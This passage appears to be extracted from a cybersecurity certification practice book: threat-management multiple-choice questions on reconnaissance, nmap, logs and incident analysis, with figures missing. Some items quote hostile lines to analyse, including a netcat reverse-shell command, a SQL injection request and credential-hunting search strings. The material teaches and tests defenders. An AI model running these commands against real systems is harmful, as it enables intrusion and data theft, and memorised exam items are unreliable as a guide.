+2017-07-11        14:39:30.606 0.448    TCP      192.168.2.1:1451->10.2.3.1:443      10        1510    12017-07-11        14:39:30.826 0.448    TCP      10.2.3.1:443->192.168.2.1:1451      7         360     12017-07-11        14:45:32.495 18.492   TCP      10.6.2.4:443->192.168.2.1:1496      5         1107    12017-07-11        14:45:32.255 18.888   TCP      192.168.2.1:1496->10.6.2.4:443      11        1840    12017-07-11        14:46:54.983 0.000    TCP      192.168.2.1:1496->10.6.2.4:443      1         49      12008-12-09        16:45:34.764 0.362    TCP      10.6.2.4:443->192.168.2.1:4292      4         1392    12008-12-09        16:45:37.516 0.676    TCP      192.168.2.1:4292->10.6.2.4:443      4         462     12008-12-09        16:46:38.028 0.000    TCP      192.168.2.1:4292->10.6.2.4:443      2         89      12017-07-11        14:45:23.811 0.454    TCP      192.168.2.1:1515->10.6.2.5:443      4         263     12017-07-11        14:45:28.879 1.638    TCP      192.168.2.1:1505->10.6.2.5:443      18        2932    12017-07-11        14:45:29.087 2.288    TCP      10.6.2.5:443->192.168.2.1:1505      37        48125   12017-07-11        14:45:54.027 0.224    TCP      10.6.2.5:443->192.168.2.1:1515      2         1256    12017-07-11        14:45:58.551 4.328    TCP      192.168.2.1:1525->10.6.2.5:443      10        648     12017-07-11        14:45:58.759 0.920    TCP      10.6.2.5:443->192.168.2.1:1525      12        15792   12017-07-11        14:46:32.227 14.796   TCP      192.168.2.1:1525->10.8.2.5:443      31        1700    12017-07-11        14:46:52.983 0.000    TCP      192.168.2.1:1505->10.8.2.5:443      1         40      1
+A. 1
+B. 3
+C. 4
+D. 5
+
+Chapter 1  ■ Domain 1: Threat Management  7
+18. Rick is auditing a Cisco router configuration and notes the following line:
+login block-for 120 attempt 5 with 60
+What type of setting has been enabled?
+A. A DDoS prevention setting
+B. A back-off setting
+C. A telnet security setting
+D. An autologin prevention setting
+19. As a U.S. government employee, Michael is required to ensure that the network devices 
+that he procures have a verified chain of custody for every chip and component that goes into them. What is this program known as?
+A.
+ Gray market procurement
+B. Trusted Foundry
+C. White market procurement
+D. Chain of Procurement
+20. During a network reconnaissance exercise, Chris gains access to a PC located in a secure 
+network. If Chris wants to locate database and web servers that the company uses, what command-line tool can he use to gather information about other systems on the local net-work without installing additional tools or sending additional traffic?
+A.
+ ping
+B. traceroute
+C. nmap
+D. netstat
+21. Alice is conducting a penetration test of a client’s systems. As part of her test, she gathers 
+information from the social media feeds of staff members who work for her client. What phase of the NIST penetration testing process is she currently in?
+A.
+ Social engineering
+B. Discovery
+C. Analysis
+D. Social media profiling
+22. What is the default nmap  scan type when nmap  is not provided with a scan type flag?
+A. A TCP FIN scan
+B. A TCP connect scan
+C. A TCP SYN scan
+D. A UDP scan
+
+8 Chapter 1  ■ Domain 1: Threat Management
+23. Isaac wants to grab the banner from a remote web server using commonly available tools. 
+Which of the following tools cannot be used to grab the banner from the remote host?
+A. netcat
+B. telnet
+C. wget
+D. ftp
+24. Charles wants to limit what potential attackers can gather during passive or semipassive 
+reconnaissance activities. Which of the following actions will typically reduce his organi-zation’s footprint the most?
+A.
+ Limit information available via the organizational website without authentication.
+B. Use a secure domain registration.
+C. Limit technology references in job postings.
+D. Purge all document metadata before posting.
+25. Cassandra’s nmap  scan of an open wireless network (192.168.10/24) shows the following 
+host at IP address 192.168.1.1. Which of the following is most likely to be the type of sys-
+tem at that IP address based on the scan results shown?
+A. A virtual machine
+B. A wireless router
+C. A broadband router
+D. A print server
+26. While reviewing Shodan scan data for his organization, John notices the following entry. Which of the following is false?
+
+
+Chapter 1  ■ Domain 1: Threat Management  9
+A. The device allows telnet connections.
+B. There is a console port on a nonstandard port.
+C. The device requires sshv1.
+D. The device is an automated tank gauge.
+27. Lauren has local access to a Windows workstation and wants to gather information about 
+the organization that it belongs to. What type of information can she gain if she executes the command 
+nbtstat -c ?
+A. MAC addresses and IP addresses of local systems
+B. NetBIOS name-to-IP address mappings
+C. A list of all NetBIOS systems that the host is connected to
+D. NetBIOS MAC-to-IP address mappings
+28. Tracy believes that a historic version of her target’s website may contain data she needs for her reconnaissance. What tool can she use to review snapshots of the website from mul-tiple points in time?
+A.
+ Time Machine
+B. Morlock
+C. Wayback Machine
+D. Her target’s web cache
+29. After Kristen received a copy of an nmap  scan run by a penetration tester that her company 
+hired, she knows that the tester used the -O flag. What type of information should she 
+expect to see included in the output other than open ports?A.
+ OCMP status
+B. Other ports
+C. Objective port assessment data in verbose mode
+D. Operating system and Common Platform Enumeration (CPE) data
+30. Andrea wants to conduct a passive footprinting exercise against a target company. Which 
+of the following techniques is not suited to a passive footprinting process?
+A. WHOIS lookups
+B. Banner grabbing
+C. BGP looking glass usage
+D. Registrar checks
+
+10 Chapter 1  ■ Domain 1: Threat Management
+31. While gathering reconnaissance data for a penetration test, Charleen uses the MxToolbox 
+MX Lookup tool. What can she determine from the response to her query shown here?
+A. The mail servers are blacklisted.
+B. The mail servers have failed an SMTP test.
+C. The mail servers are clustered.
+D. There are two MX hosts listed in DNS.
+32. Alex wants to scan a protected network and has gained access to a system that can com-municate to both his scanning system and the internal network, as shown in the image here. What type of 
+nmap  scan should Alex conduct to leverage this host if he cannot install 
+nmap  on system A?
+A
+Protected Network
+A. A reflection scan
+B. A proxy scan
+C. A randomized host scan
+D. A ping -through scan
+
+Chapter 1  ■ Domain 1: Threat Management  11
+33. As a member of a blue team, John observed the following behavior during an external pen-
+etration test. What should he report to his managers at the conclusion of the test?
+A. A significant increase in latency
+B. A significant increase in packet loss
+C. Latency and packet loss both increased.
+D. No significant issues were observed.
+34. As part of an organization-wide red team exercise, Frank is able to use a known vulner-ability to compromise an Apache web server. Once he has gained access, what should his next step be if he wants to use the system to pivot to protected systems behind the DMZ that the web server resides in?
+A.
+ Vulnerability scanning
+B. Privilege escalation
+C. Patching
+D. Installing additional tools
+35. As part of her malware analysis process, Caitlyn diagrams the high-level functions and 
+processes that the malware uses to accomplish its goals. What is this process known as?
+A. Static analysis
+B. Composition
+C. Dynamic analysis
+D. Decomposition
+
+12 Chapter 1  ■ Domain 1: Threat Management
+36. Alex has been asked to assess the likelihood of reconnaissance activities against her orga-
+nization (a small, regional business). Her first assignment is to determine the likelihood of port scans against systems in her organization’s DMZ. How should she rate the likelihood of this occurring?
+A.
+ Low
+B. Medium
+C. High
+D. There is not enough information for Alex to provide a rating.
+Use the following scenario for the questions 37 through 39.
+Lucy is the SOC operator for her organization and is responsible for monitoring her  
+organization’s SIEM and other security devices. Her organization has both domestic and inter-national sites, and many of their employees travel frequently.
+37.
+ While Lucy is monitoring the SIEM, she notices that all of the log sources from her orga-nization’s New York branch have stopped reporting for the past 24 hours. What type of detection rules or alerts should she configure to make sure she is aware of this sooner  next time?
+A.
+ Heuristic
+B. Behavior
+C. Availability
+D. Anomaly
+38. After her discovery in the first part of this question, Lucy is tasked with configuring alerts 
+that are sent to system administrators. She builds a rule that can be represented in pseudo-code as follows:
+Send a SMS alert every 30 seconds when systems do not send logs for more than 1 minute.The average administrator at Lucy’s organization is responsible for 150 to 300 machines.What danger does Lucy’s alert create?
+A.
+ A DDoS that causes administrators to not be able to access systems
+B. A network outage
+C. Administrators may ignore or filter the alerts.
+D. A memory spike
+39. Lucy configures an alert that detects when users who do not typically travel log in from 
+other countries. What type of analysis is this?
+A. Trend
+B. Availability
+C. Heuristic
+D. Behavior
+
+Chapter 1  ■ Domain 1: Threat Management  13
+40. During his analysis of a malware sample, John reviews the malware files and binaries 
+without running them. What type of analysis is this?
+A. Automated analysis
+B. Dynamic analysis
+C. Static analysis
+D. Heuristic analysis
+41. The company that Lauren works for is making significant investments in infrastructure-
+as-a-service hosting to replace its traditional data center. Members of her organization’s management have expressed concerns about data remanence when Lauren’s team moves from one virtual host to another in their cloud service provider’s environment. What should she instruct her team to do to avoid this concern?
+A.
+ Zero-wipe drives before moving systems.
+B. Use full-disk encryption.
+C. Use data masking.
+D. Span multiple virtual disks to fragment data.
+42. Lucca wants to prevent workstations on his network from attacking each other. If Lucca’s 
+corporate network looks like the network shown here, what technology should he select to prevent laptop A from being able to attack workstation B?
+Border Router
+BFirewallInternet
+A
+A. An IPS
+B. An IDS
+C. A HIPS
+D. A HIDS
+
+14 Chapter 1  ■ Domain 1: Threat Management
+43. Geoff wants to stop all traffic from reaching or leaving a Linux system with an iptables  
+firewall. Which of the following commands is not one of the three iptables  commands 
+needed to perform this action?
+A. #iptables-policy INPUT DROP
+B. #iptables-policy SERVICE DROP
+C. #iptables-policy OUTPUT DROP
+D. #iptables-policy FORWARD DROP
+44. The company that Dan works for has recently migrated to a SaaS provider for its enter-
+prise resource planning (ERP) software. In its traditional on-site ERP environment, Dan conducted regular port scans to help with security validation for the systems. What will Dan most likely have to do in this new environment?
+A.
+ Use a different scanning tool.
+B. Rely on vendor testing and audits.
+C. Engage a third-party tester.
+D. Use a VPN to scan inside the vendor’s security perimeter.
+45. Charles uses Network Miner to review packet captures from his reconnaissance of a target 
+organization. One system displayed the information shown here. What information has Network Miner used to determine that the PC is a Hewlett-Packard device?
+A. The MAC address
+B. The OS flags
+C. The system’s banner
+D. The IP address
+46. Laura’s organization has been receiving a large amount of spam email sent specifically to the email addresses listed in her organization’s domain registrations. Which of the follow-ing techniques will help her organization limit this type of spam?
+A.
+ DNS query rate limiting
+B. CAPTCHAs
+C. Using a proxy service
+D. Blacklisting
+
+Chapter 1  ■ Domain 1: Threat Management  15
+47. Eric believes that his organization has a number of vulnerable systems that have been 
+scanned by third parties. If he wants to check publicly available vulnerability information, which of the following methods are best suited to performing this type of passive  reconnaissance?
+A.
+ Use the worldwide nmap  database.
+B. Search for his domain in Shodan.
+C. Use the OpenVAS central vulnerability data repository.
+D. Check against the CVE database for his domain.
+48. Adam knows that netcat  is a useful penetration testing tool. Which of the following is 
+not a way that he can use netcat , if he is using it as his only tool?
+A. File transfer
+B. Port scanner
+C. Encrypted shell
+D. Reverse shell
+49. Which of the following tools can be used to passively gather the information required to 
+generate a network topology map?
+A. Wireshark
+B. nmap
+C. SolarWinds Network Mapper
+D. Nessus
+50. Lauren wants to use an advanced Google query to search for information that is not read-
+ily available as part of her reconnaissance efforts. What term is commonly used to describe these searches?
+A.
+ Google whacks
+B. SuperGoogles
+C. Google dorks
+D. Google gizmos
+51. What type of control review will focus on change management as a major element in its 
+assessment scope?
+A. Operational control review
+B. Technical control review
+C. Detective control review
+D. Responsive control review
+
+16 Chapter 1  ■ Domain 1: Threat Management
+52. As part of her reconnaissance process for her organization’s internal security review, 
+Olivia uses Shodan to search for hosts within her target’s IP range. She discovers the fol-lowing Shodan entry listing for one of her target’s devices. What should she do with this information?
+A. Activate the incident response process.
+B. Contact the device administrator.
+C. Log in to validate the finding.
+D. Nothing, because this is a false positive.
+53. Kathleen wants to verify on a regular basis that a file has not changed on the system that she is responsible for. Which of the following methods is best suited to this?
+A.
+ Use sha1sum to generate a hash for the file and write a script to check it periodically.
+B. Install and use Tripwire.
+C. Periodically check the MAC information for the file using a script.
+D. Encrypt the file and keep the key secret so the file cannot be modified.
+54. Selah has been tasked with gathering information to increase her penetration testing 
+team’s understanding of their customer’s Internet footprint. She wants to gather details of emails, subdomains, employee names, and other information in an automated way. Which of the following tools is best suited to her needs?
+A.
+ nmap
+B. theHarvester
+C. Shodan
+D. osint-ng
+55. While reviewing the Wireshark packet capture shown here, Ryan notes an extended ses-
+sion using the ESP protocol. When he clicks the packets, he is unable to make sense of the content. What should Ryan look for on the workstation with IP address 10.0.0.1 if he investigates it in person?
+
+Chapter 1  ■ Domain 1: Threat Management  17
+A. An encrypted RAT
+B. A VPN application
+C. A secure web browser
+D. A base64-encoded packet transfer utility
+56. Ben wants to quickly check a suspect binary file for signs of its purpose or other informa-
+tion that it may contain. What Linux tool can quickly show him potentially useful infor-mation contained in the file?
+A.
+ grep
+B. more
+C. less
+D. strings
+
+18 Chapter 1  ■ Domain 1: Threat Management
+57. While investigating a malware infection, Lauren discovers that the hosts file for the system 
+she is reviewing contains multiple entries, as shown here:
+0.0.0.0     symantec.com
+0.0.0.0     mcafee.com0.0.0.0     microsoft.com0.0.0.0     kapersky.com
+Why would the malware make this change?
+A. To redirect 0.0.0.0 to known sites
+B. To prevent antivirus updates
+C. To prevent other attackers from compromising the system
+D. To enable remote access to the system
+58. Alice believes that one of her users may be taking malicious action on the systems she has 
+access to. When she walks past her user’s desktop, she sees the following command on the screen:
+user12@workstation:/home/user12# ./john -wordfile:/home/user12/mylist.txt 
+-format:lm hash.txt
+What is the user attempting to do?
+A. They are attempting to hash a file.
+B. They are attempting to crack hashed passwords.
+C. They are attempting to crack encrypted passwords.
+D. They are attempting a pass-the-hash attack.
+59. nmap  provides a standardized way to name hardware and software that it detects. What is 
+this called?A.
+ CVE
+B. HardwareEnum
+C. CPE
+D. GearScript
+60. Charles wants to detect port scans using syslog so that he can collect and report on the 
+information using his SIEM. If he is using a default CentOS system, what should he do?
+A. Search for use of privileged ports in sequential order.
+B. Search for connections to ports in the /var/syslog  directory.
+
+Chapter 1  ■ Domain 1: Threat Management  19
+C. Log all kernel messages to detect scans.
+D. Install additional tools that can detect scans and send the logs to syslog.
+61. Alex wants to list all of the NetBIOS sessions open on a workstation. What command 
+should he issue to do this?
+A. nbtstat -o
+B. nbtstat -r
+C. nbtstat -s
+D. nbtstat -c
+62. Lucas believes that an attacker has successfully compromised his web server. Using the fol-
+lowing output of ps, identify the process ID he should focus on.
+root      507  0.0  0.1 258268  3288 ?     Ssl  15:52  0:00 /usr/sbin/rsyslogd -n
+message+  508  0.0  0.2  44176  5160 ?     Ss   15:52   0:00 /usr/bin/dbus-daemon --system --address=systemd: 
+--nofork --nopidfile --systemd-activa
+root      523  0.0  0.3 281092  6312 ?     Ssl  15:52  0:00 /usr/lib/accountsservice/accounts-daemon
+root      524  0.0  0.7 389760 15956 ?     Ssl  15:52  0:00 /usr/sbin/NetworkManager --no-daemonroot      527  0.0  0.1  28432  2992 ?     Ss   15:52  0:00 /lib/systemd/systemd-logindapache    714  0.0  0.1  27416  2748 ?     Ss   15:52  0:00 /www/temp/webminroot      617  0.0  0.1  19312  2056 ?     Ss   15:52  0:00 /usr/sbin/irqbalance --pid=/var/run/irqbalance.pidroot      644  0.0  0.1 245472  2444 ?     Sl   15:52  0:01 /usr/sbin/VBoxServiceroot      653  0.0  0.0  12828  1848 tty1  Ss+  15:52  0:00 /sbin/agetty --noclear tty1 linuxroot      661  0.0  0.3 285428  8088 ?     Ssl  15:52  0:00 /usr/lib/policykit-1/polkitd --no-debugroot      663  0.0  0.3 364752  7600 ?     Ssl  15:52  0:00 /usr/sbin/gdm3root      846  0.0  0.5 285816 10884 ?     Ssl  15:53  0:00 /usr/lib/upower/upowerdroot      867  0.0  0.3 235180  7272 ?     Sl   15:53  0:00 gdm-session-worker [pam/gdm-launch-environment]Debian-+  877  0.0  0.2  46892  4816 ?     Ss   15:53  0:00 /lib/systemd/systemd --userDebian-+  878  0.0  0.0  62672  1596 ?     S    15:53  0:00 (sd-pam)
+A. 508
+B. 617
+C. 846
+D. 714
+
+20 Chapter 1  ■ Domain 1: Threat Management
+63. While reviewing the filesystem of a potentially compromised system, Angela sees the fol-
+lowing output when running ls -la . What should her next action be after seeing this?
+A. Continue to search for other changes.
+B. Run diff against the password file.
+C. Immediately change her password.
+D. Check the passwd binary against a known good version.
+64. Michelle has been experiencing SYN floods and deploys a mitigation technique that allows the server to respond as if SYNs were accepted but then delete the SYN entry in its queue. If the client then responds with a SYN-ACK, the server reconstructs the SYN entry and continues the connection. What technique is Michelle using?
+A.
+ SYN cookies
+B. ACK-ACK
+C. TCP frogging
+D. SYN replay
+65. What two phases of the NIST penetration testing cycle are often repeated during a test?A.
+ Planning and discovery
+B. Discovery and attack
+C. Planning and attack
+D. Discovery and reporting
+66. Geoff is responsible for hardening systems on his network and discovers that a number of 
+network appliances have exposed services including telnet, FTP, and web servers. What is his best option to secure these systems?
+A.
+ Enable host firewalls.
+B. Install patches for those services.
+C. Turn off the services for each appliance.
+D. Place a network firewall between the devices and the rest of the network.
+
+Chapter 1  ■ Domain 1: Threat Management  21
+67. Lauren is performing passive intelligence gathering and discovers a directory filled with 
+photos taken by her target organization’s staff. If she wants to review the metadata from the photos, what tool can she use to do so?
+A.
+ Strings
+B. Exiftool
+C. Wireshark
+D. Stegdetect
+68. Lauren’s network firewall denies all inbound traffic but allows all outbound traffic.  
+While investigating a Windows workstation, she encounters a script that runs the follow-ing command:
+at \\workstation10 20:30 every:F nc -nv 10.1.2.3 443 -e cmd.exe
+What does it do?
+A. It opens a reverse shell for host 10.1.2.3 using netcat  every Friday at 8:30.
+B. It uses the AT command to dial a remote host via NetBIOS.
+C. It creates an HTTPS session to 10.1.2.3 every Friday at 8:30.
+D. It creates a VPN connection to 10.1.2.3 every five days at 8:30 GST.
+69. While conducting reconnaissance of his own organization, Chris discovers that multiple 
+certificates are self-signed. What issue should he report to his management?
+A. Self-signed certificates do not provide secure encryption for site visitors.
+B. Self-signed certificates can be revoked only by the original creator.
+C. Self-signed certificates will cause warnings or error messages.
+D. None of the above
+70. Isaac has access to a Windows system that is a member of the local Active Directory 
+domain as part of his white-box penetration test. Which of the following commands might provide information about other systems on the network?
+A.
+ net use
+B. net user
+C. net group
+D. net config
+71. During the reconnaissance stage of a penetration test, Fred calls a number of staff at the 
+target organization. Using a script he prepared, Fred introduces himself as part of the sup-port team for their recently installed software and asks for information about the software and its configuration. What is this technique called?
+A.
+ Pretexting
+B. OSINT
+C. A tag-out
+D. Profiling
+
+22 Chapter 1  ■ Domain 1: Threat Management
+72. Geoff needs to lock down a Windows workstation that has recently been scanned using 
+nmap  with the results shown here. He knows that the workstation needs to access websites 
+and that the system is part of a Windows domain. What ports should he allow through the 
+system’s firewall for externally initiated connections?
+A. 80, 135, 139, and 445
+B. 80, 445, and 3389
+C. 135, 139, and 445
+D. No ports should be open.
+73. Lucca wants to identify systems that may have been compromised and are being used for data exfiltration. Which of the following technologies should he put into place to capture data that he can analyze using his SIEM to find this behavior?
+A.
+ A firewall
+B. A netflow collector
+C. A honeypot
+D. A BGP monitor
+74. During a white-box penetration test, Luke finds that he is suddenly unable to connect to 
+the target network. What has likely happened?
+A. Automated shunning
+B. Network link failure
+C. Back-off algorithms
+D. A BGP route change
+75. Adam’s port scan returns results on six TCP ports: 22, 80, 443, 515, 631, and 9100.  
+If Adam needs to guess what type of device this is based on these ports, what is his best guess?
+A.
+ A web server
+B. An FTP server
+
+Chapter 1  ■ Domain 1: Threat Management  23
+C. A printer
+D. A proxy server
+76. Cassandra believes that attackers were able to extract a volume shadow copy of a worksta-
+tion belonging to her organization’s Windows domain administrator. What information should she not report as being potentially exposed?
+A.
+ All files on the user’s desktop
+B. Password hashes
+C. Domain details
+D. Plain-text Windows account passwords
+77. Lauren is contacted by a concerned administrator who notes that almost all of their  
+Windows 10 Enterprise workstations are reporting the following issue after a patch deployment. What important policy may be missing?
+A. Active hours
+B. Required reboots
+C. Automatic updates
+D. Network time synchronization
+78. Jarett needs to protect an application server against resource exhaustion attacks. Which of the following techniques is best suited to surviving a large-scale DDoS attack?
+A.
+ Enable application sharding.
+B. Review each query and implement query optimization.
+C. Implement aggressive aging at the organization’s firewall.
+D. Employ a CDN.
+79. In his role as the SOC operator, Frank regularly scans a variety of servers in his organi-
+zation. After two months of reporting multiple vulnerabilities on a Windows file server, Frank recently escalated the issue to the server administrator’s manager.
+At the next weekly scan window, Frank noticed that all of the vulnerabilities were no  
+longer active; however, ports 137, 139, and 445 were still showing as open. What most likely happened?
+A.
+ The server administrator blocked the scanner with a firewall.
+B. The server was patched.
+C. The vulnerability plug-ins were updated and no longer report false positives.
+D. The system was offline.
+
+24 Chapter 1  ■ Domain 1: Threat Management
+80. While conducting reconnaissance, Greg discovers what he believes is an SMTP service 
+running on an alternate port. What technique should he use to manually validate his guess?
+A.
+ Send an email via the open port.
+B. Send an SMTP probe.
+C. telnet to the port.
+D. ssh to the port.
+81. Adam is reviewing his organization’s security footprint by conducting reconnaissance 
+activities. After reviewing a list of Google dorks, he runs the following search:
+"mysqli_connect" ext:inc
+If it returns data, what should he recommend in his report to management?
+A. Block MySQL connections from remote hosts.
+B. Initiate the organization’s incident response process.
+C. Immediately change MySQL passwords and review configurations.
+D. Change all MySQL connection strings.
+82. Rick’s manager wants to present the most trustworthy certificate possible for a website. 
+What type of certificate should Rick get?
+A. EV
+B. DV
+C. OV
+D. IV
+83. While reviewing web server logs, Danielle notices the following entry. What occurred?
+10.11.210.6 - GET /wordpress/wp-admin/theme-editor.php?file=404.php&theme= 
+total 200
+A. A theme was changed.
+B. A file was not found.
+C. There was an attempt to edit the 404 page.
+D. The 404 page was displayed.
+84. While reviewing his Apache logs, Charles discovers the following entry. What has 
+occurred?
+10.1.1.1 - - [27/Jun/2017:11:42:22 -0500] "GET 
+/query.php?searchterm=stuff&%20lid=1%20UNION%20SELECT%200,username,user_
+id,password,
+
+Chapter 1  ■ Domain 1: Threat Management  25
+name,%20email,%20FROM%20users HTTP/1.1" 200 9918 "-" "Mozilla/4.0 
+(compatible; MSIE 
+6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)"
+A. A successful database query
+B. A PHP overflow attack
+C. A SQL injection attack
+D. An unsuccessful database query
+85. What two pieces of information does nmap  need to estimate network path distance?
+A. IP address and TTL
+B. TTL and operating system
+C. Operating system and BGP flags
+D. TCP flags and IP address
+86. Charles needs to make sure he has found the correct social media profile for a target of 
+his OSINT process. Which of the following includes the three critical items needed to uniquely identify the majority of Americans?
+A.
+ Height, weight, and eye color
+B. Date of birth, gender, and zip code
+C. Zodiac sign, gender, and zip code
+D. Age, height, and weight
+87. While reviewing logs from users with root privileges on an administrative jump box, Alex 
+discovers the following suspicious command:
+nc -l -p 43501 < example.zip
+What happened?
+A. The user set up a reverse shell running as example.zip .
+B. The user set up netcat  as a listener to push example.zip .
+C. The user set up a remote shell running as example.zip .
+D. The user set up netcat  to receive example.zip .
+88. During an on-site penetration test of a small business, Bob scans outward to a known host 
+to determine the outbound network topology. What information can he gather from the results provided by Zenmap?
+
+26 Chapter 1  ■ Domain 1: Threat Management
+A. There are two nodes on the local network.
+B. There is a firewall at IP address 96.120.24.121.
+C. There is an IDS at IP address 96.120.24.121.
+D. He should scan the 10.0.2.0/24 network.
+89. Chris discovers the following entries in /var/log/auth.log . What is most likely  
+occurring?
+Aug  6 14:13:00 demo sshd[5279]: Failed password for root from 10.11.34.11 
+port 38460 ssh2
+Aug  6 14:13:00 demo sshd[5275]: Failed password for root from 10.11.34.11 
+port 38452 ssh2
+Aug  6 14:13:00 demo sshd[5284]: Failed password for root from 10.11.34.11 
+port 38474 ssh2
+Aug  6 14:13:00 demo sshd[5272]: Failed password for root from 10.11.34.11 
+port 38446 ssh2
+Aug  6 14:13:00 demo sshd[5276]: Failed password for root from 10.11.34.11 
+port 38454 ssh2
+Aug  6 14:13:00 demo sshd[5273]: Failed password for root from 10.11.34.11 
+port 38448 ssh2
+Aug  6 14:13:00 demo sshd[5271]: Failed password for root from 10.11.34.11 
+port 38444 ssh2
+Aug  6 14:13:00 demo sshd[5280]: Failed password for root from 10.11.34.11 
+port 38463 ssh2
+
+Chapter 1  ■ Domain 1: Threat Management  27
+Aug  6 14:13:01 demo sshd[5302]: Failed password for root from 10.11.34.11 
+port 38478 ssh2
+Aug  6 14:13:01 demo sshd[5301]: Failed password for root from 10.11.34.11 
+port 38476 ssh2
+A. A user has forgotten their password.
+B. A brute-force attack against the root account
+C. A misconfigured service
+D. A denial-of-service attack against the root account
+90. As part of his reconnaissance effort, Charles uses the following Google search string:
+"authentication failure; logname=" ext:log;site:example.com
+What will he find if he receives results from his target’s domain?
+A. A list of successful logins
+B. A list of log names
+C. A list of failed logins
+D. A list of log files
+91. While reviewing email logs for his domain’s email server, Rick notices that a single remote 
+host is sending email to usernames that appear to be in alphabetical order:
+aaron@domain.com
+abbott@domain.comabel@domain.comabigail@domain.comada@domain.comadam@domain.com...
+This behavior continues for thousands of entries, resulting in many bounced email mes-
+sages, but some make it through. What type of reconnaissance has Rick encountered?
+A. Brute force
+B. Domain harvesting
+C. Domain probe
+D. Email list builder
+92. Which of the following capabilities is not a typical part of an SIEM system?A.
+ Alerting
+B. Performance management
+C. Data aggregation
+D. Log retention
+
+28 Chapter 1  ■ Domain 1: Threat Management
+93. What major issue would Charles face if he relied on hashing malware packages to identify 
+malware packages?
+A. Hashing can be spoofed.
+B. Collisions can result in false positives.
+C. Hashing cannot identify unknown malware.
+D. Hashing relies on unencrypted malware samples.
+Use the following network diagram and scenario to answer the next three questions:
+Location A
+Location DInternet
+Location BData Center
+Network
+Location C
+Lauren is a security analyst who has been tasked with performing nmap  scans of her organiza-
+tion’s network. She is a new hire and has been given this logical diagram of the organization’s 
+network but has not been provided with any additional detail.
+94. Lauren wants to determine what IP addresses to scan from location A. How can she find this information?
+A.
+ Scan the organization’s web server and then scan the other 255 IP addresses in its  
+subnet.
+B. Query DNS to find her organization’s registered hosts.
+C. Contact ICANN to request the data.
+D. Use traceroute  to identify the network that the organization’s domain resides in.
+
+Chapter 1  ■ Domain 1: Threat Management  29
+95. If Lauren runs a scan from location B that targets the servers on the data center network 
+and then runs a scan from location C, what differences is she most likely to see between the scans?
+A.
+ The scans will match.
+B. Scans from location C will show no open ports.
+C. Scans from location C will show fewer open ports.
+D. Scans from location C will show more open ports.
+96. Lauren wants to perform regular scans of the entire organizational network but only has 
+a budget that supports buying hardware for a single scanner. Where should she place her scanner to have the most visibility and impact?
+A.
+ Location A
+B. Location B
+C. Location C
+D. Location D
+97. Andrea needs to add a firewall rule that will prevent external attackers from conducting 
+topology gathering reconnaissance on her network. Where should she add a rule intended to block this type of traffic?
+Internet
+A − FirewallB − Router
+C − Layer 3 Distribution Switch
+D − Windows 2012 Server
+A. The firewall
+B. The router
+C. The distribution switch
+D. The Windows 2012 server
+
+30 Chapter 1  ■ Domain 1: Threat Management
+98. Alex has been asked to investigate a call to one of his organization’s system administrators 
+that is believed to have led to a breach. The administrator described that call by saying that the caller identified themselves as the assistant to the director of sales and said that they needed access to a file that was critical to a sales presentation with a major client but that their lap -
+top had died. The administrator provided a link to the file, which included the organization’s sales data for the quarter. What type of social engineering occurred?
+A.
+ Baiting
+B. Quid pro quo
+C. Pretexting
+D. Whaling
+99. Which of the three key objectives of cybersecurity is often ensured by using techniques like 
+hashing and the use of tools like Tripwire?
+A. Confidentiality
+B. Integrity
+C. Identification
+D. Availability
+100. The netflow collector that Sam’s security team uses is capable of handling 1 gigabit of 
+traffic per second. As Sam’s organization has grown, it has increased its external network connection to a 2 gigabit per second external link and has begun to approach full utiliza-tion at various times during the day. If Sam’s team does not have new budget money to purchase a more capable collector, what option can Sam use to still collect useful data?
+A.
+ Enable QoS
+B. Enable netflow compression
+C. Enable sampling
+D. None of the above
+101. Senior C-level executives at the organization that Alex works for have received targeted 
+phishing messages that include a fake organizational login page link and a message that states that their passwords were inadvertently reset during a scheduled maintenance win-dow. What type of attack should Alex describe in his after action report?
+A.
+ Tuna phishing
+B. Whaling
+C. Spear phishing
+D. SAML phishing
+
+Chapter 1  ■ Domain 1: Threat Management  31
+102. Brandon wants to perform a WHOIS query for a system he believes is located in Europe. 
+Which NIC should he select to have the greatest likelihood of success for his query?
+A. AFRINIC
+B. APNIC
+C. RIPE
+D. LACNIC
+103. Chris wants to determine what TCP ports are listening on a Windows system. What is his 
+best option to determine this from the command line?
+A. Use arp -a .
+B. Use netstat -lt .
+C. Use nmap -t 127.0.0.1 .
+D. There is not a Windows command do to this.
+104. As part of her system hardening process for a Windows 10 workstation, Lauren runs the 
+Microsoft Baseline System Analyzer. She sees the following result after MBSA runs. What can she determine from this scan?
+A. The system has been compromised, and shares allow all users to read and execute administrative files.
+B.
+ The system has default administrative shares enabled.
+C. The system is part of a domain that uses administrative shares to manage systems.
+D. The shares are properly secured and pose no threat to the system.
+
+32 Chapter 1  ■ Domain 1: Threat Management
+105. While Greg was performing a port scan of a critical server system, the system administra-
+tors at his company observed the behavior shown here in their network management soft-ware suite. What action should Greg take after he is shown this chart?
+A. Increase the number of concurrent scans.
+B. Decrease the number of ports scanned.
+C. Decrease the number of concurrent scans.
+D. Increase the number of ports scanned.
+106. An access control system that relies on the operating system to constrain the ability of a subject to perform operations is an example of what type of access control system?
+A.
+ A discretionary access control system
+B. A role-based access control system
+C. A mandatory access control system
+D. A level-based access control system
+107. While reviewing Apache logs, Janet sees the following entries as well as hundreds of others 
+from the same source IP. What should Janet report has occurred?
+[ 21/Jul/2017:02:18:33 -0500] - - 10.0.1.1 "GET /scripts/sample.php" "-" 302 
+336 0
+[ 21/Jul/2017:02:18:35 -0500] - - 10.0.1.1 "GET /scripts/test.php" "-" 302 
+336 0
+
+Chapter 1  ■ Domain 1: Threat Management  33
+[ 21/Jul/2017:02:18:37 -0500] - - 10.0.1.1 "GET /scripts/manage.php" "-" 302 
+336 0
+[ 21/Jul/2017:02:18:38 -0500] - - 10.0.1.1 "GET /scripts/download.php" "-" 
+302 336 0
+[ 21/Jul/2017:02:18:40 -0500] - - 10.0.1.1 "GET /scripts/update.php" "-" 302 
+336 0
+[ 21/Jul/2017:02:18:42 -0500] - - 10.0.1.1 "GET /scripts/new.php" "-" 302 
+336 0
+A. A denial-of-service attack
+B. A vulnerability scan
+C. A port scan
+D. A directory traversal attack
+108. Charles received a pcap file from a system administrator at a remote site who was con-
+cerned about the traffic it showed. What type of behavior should Charles report after his analysis of the file?
+A. A DOS attack
+B. Port scanning
+C. A DDoS attack
+D. Service access issues
+
+34 Chapter 1  ■ Domain 1: Threat Management
+109. Susan is reviewing files on a Windows workstation and believes that cmd.exe  has been 
+replaced with a malware package. Which of the following is the best way to validate her 
+theory?
